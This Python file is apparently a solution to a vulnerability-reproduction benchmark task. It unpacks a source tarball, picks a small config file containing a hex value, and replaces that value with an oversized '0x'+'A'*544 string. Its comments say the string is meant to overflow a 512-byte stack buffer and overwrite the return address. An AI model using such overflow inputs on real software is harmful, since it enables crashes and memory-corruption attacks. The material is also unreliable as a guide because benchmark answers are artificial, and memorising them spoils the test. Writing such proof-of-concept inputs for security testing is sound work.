import os
import tarfile
import tempfile
import shutil
import re
import fnmatch

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            # Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=temp_dir)
            
            # Define patterns for finding configuration files
            patterns = ['*.conf', '*.cfg', '*.ini', '*.rc', 'config', '*sample*', '*example*', '*.xml', '*.json']
            exclusions = ['.c', '.h', '.cpp', '.cc', '.py', '.sh', '.pl', '.m4', '.in', '.po', '.pot']
            
            # Regex to find hex values (starting with 0x)
            hex_pattern = re.compile(br'0x[0-9a-fA-F]+')
            
            best_content = None
            
            # Walk through the directory to find a suitable config file
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if any(f.endswith(ext) for ext in exclusions):
                        continue
                    
                    is_candidate = False
                    if any(fnmatch.fnmatch(f, p) for p in patterns):
                        is_candidate = True
                    # Also check files in example/doc/etc directories
                    elif ('example' in root.lower() or 'doc' in root.lower() or 'etc' in root.lower()):
                         if not f.startswith('.'):
                             is_candidate = True
                    
                    if is_candidate:
                        path = os.path.join(root, f)
                        try:
                            # Skip large files to avoid processing non-config binaries or huge logs
                            if os.path.getsize(path) > 50 * 1024: 
                                continue
                            
                            with open(path, 'rb') as fd:
                                content = fd.read()
                                # Check if the file contains a hex string
                                if hex_pattern.search(content):
                                    # Prefer smaller files as they are likely cleaner templates
                                    if best_content is None or len(content) < len(best_content):
                                        best_content = content
                        except Exception:
                            continue

            # Construct the overflow payload
            # Ground truth PoC is 547 bytes. This suggests a stack buffer of size 512 bytes.
            # We need to provide a hex string long enough to overflow this buffer and overwrite the return address.
            # 544 bytes of 'A' (hex 0x41) + 2 bytes '0x' = 546 bytes.
            # This should be sufficient to trigger the crash.
            overflow_payload = b'0x' + b'A' * 544
            
            if best_content:
                # Replace the first occurrence of a hex value with our overflow payload
                return hex_pattern.sub(overflow_payload, best_content, count=1)
            
            # Fallback if no suitable config file is found
            return b"option = " + overflow_payload + b"\n"
            
        except Exception:
            # Generic fallback in case of extraction or processing errors
            return b"0x" + b"A" * 550
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)